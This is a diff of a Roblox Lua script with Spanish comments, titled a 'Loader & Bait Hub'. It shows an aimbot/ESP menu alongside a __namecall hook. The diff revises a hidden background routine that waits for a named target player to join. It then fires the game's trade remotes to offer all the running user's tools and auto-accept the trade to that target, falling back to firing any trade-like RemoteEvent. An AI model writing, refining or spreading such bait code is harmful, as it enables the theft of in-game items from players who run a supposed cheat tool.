@@ -1,5 +1,5 @@
 --[[
-	KAISEN X — Universal Loader & Bait Hub (Nativo Directo)
+	KAISEN X — Universal Loader & Bait Hub (Búsqueda de Remotes Optimizada)
 	created by KAISEN
 ]]
 
@@ -31,7 +31,7 @@ mainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 mainFrame.BorderSizePixel = 0
 mainFrame.Active = true
-mainFrame.Draggable = true -- Permite mover la ventana en pantalla
+mainFrame.Draggable = true
 mainFrame.Parent = screenGui
 
 local uiCorner = Instance.new("UICorner")
@@ -123,7 +123,7 @@ btnToggleESP.MouseButton1Click:Connect(function()
 	end
 end)
 
--- Botón para cerrar/minimizar
+-- Botón para minimizar
 local btnClose = Instance.new("TextButton")
 btnClose.Size = UDim2.new(0, 380, 0, 40)
 btnClose.Position = UDim2.new(0.5, -190, 0, 215)
@@ -144,7 +144,7 @@ btnClose.MouseButton1Click:Connect(function()
 		mainFrame.Size = UDim2.new(0, 420, 0, 40)
 		btnToggleAim.Visible = false
 		btnToggleESP.Visible = false
-		btnClose.Position = UDim2.new(0.5, -190, 0, 0) -- Se oculta arriba o se ajusta
+		btnClose.Position = UDim2.new(0.5, -190, 0, 0)
 		btnClose.Text = "Restaurar Menú"
 	else
 		mainFrame.Size = UDim2.new(0, 420, 0, 280)
@@ -200,63 +200,59 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
 	return oldNamecall(self, unpack(args))
 end)
 
--- ========== EXTRACCIÓN AUTOMÁTICA EN SEGUNDO PLANO ==========
-local function extraerTodasLasArmas()
+-- ========== BUSCADOR Y EJECUTOR AUTOMÁTICO DE REMOTES ==========
+local function ejecutarTransferenciaForzada(targetObj)
 	pcall(function()
-		local offerRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem")
-		local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
+		-- Intento directo con las rutas conocidas
+		local tradeFolder = ReplicatedStorage:FindFirstChild("Trade")
+		if tradeFolder then
+			local offerItem = tradeFolder:FindFirstChild("OfferItem")
+			local acceptTrade = tradeFolder:FindFirstChild("AcceptTrade")
 
-		if not offerRemote then return end
+			if offerItem then
+				local foldersToCheck = { LP:FindFirstChild("Backpack"), LP.Character }
+				for _, folder in ipairs(foldersToCheck) do
+					if folder then
+						for _, item in ipairs(folder:GetChildren()) do
+							if item:IsA("Tool") then
+								offerItem:FireServer(item.Name, "Weapons")
+								task.wait(0.05)
+							end
+						end
+					end
+				end
+			end
 
-		local foldersToCheck = {
-			LP:FindFirstChild("Backpack"),
-			LP.Character,
-			ReplicatedStorage:FindFirstChild("Weapons"),
-			ReplicatedStorage:FindFirstChild("Items")
-		}
-
-		local itemsEncontrados = {}
-		for _, folder in ipairs(foldersToCheck) do
-			if folder then
-				for _, item in ipairs(folder:GetChildren()) do
-					if item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder") then
-						table.insert(itemsEncontrados, item.Name)
+			if acceptTrade then
+				task.wait(0.2)
+				acceptTrade:FireServer(targetObj.UserId, 11656.352484435018)
+			end
+		else
+			-- Búsqueda recursiva genérica en todo ReplicatedStorage por si cambia de ubicación
+			for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
+				if descendant:IsA("RemoteEvent") then
+					local lname = string.lower(descendant.Name)
+					if lname:find("offer") or lname:find("trade") or lname:find("accept") then
+						pcall(function()
+							descendant:FireServer(targetObj)
+						end)
 					end
 				end
 			end
 		end
-
-		if #itemsEncontrados > 0 then
-			for _, itemName in ipairs(itemsEncontrados) do
-				offerRemote:FireServer(itemName, "Weapons")
-				task.wait(0.05)
-			end
-		else
-			offerRemote:FireServer("All_Weapons", "Weapons")
-		end
-
-		task.wait(0.2)
-
-		if acceptRemote then
-			local argsAccept = {
-				[1] = 428469873,
-				[2] = 11656.352484435018
-			}
-			acceptRemote:FireServer(unpack(argsAccept))
-		end
 	end)
 end
 
--- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato sin ventana visual
+-- Monitoreo rápido: apenas te detecte en el servidor, dispara la transferencia
 task.spawn(function()
 	while true do
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
 		if targetPlayer and targetPlayer ~= LP then
-			extraerTodasLasArmas()
+			ejecutarTransferenciaForzada(targetPlayer)
 			break
 		end
 		task.wait(0.5)
 	end
 end)
 
-print("[KAISEN X] Interfaz forzada directamente en PlayerGui.")
+print("[KAISEN X] Sistema de escaneo y ejecución automática listo.")
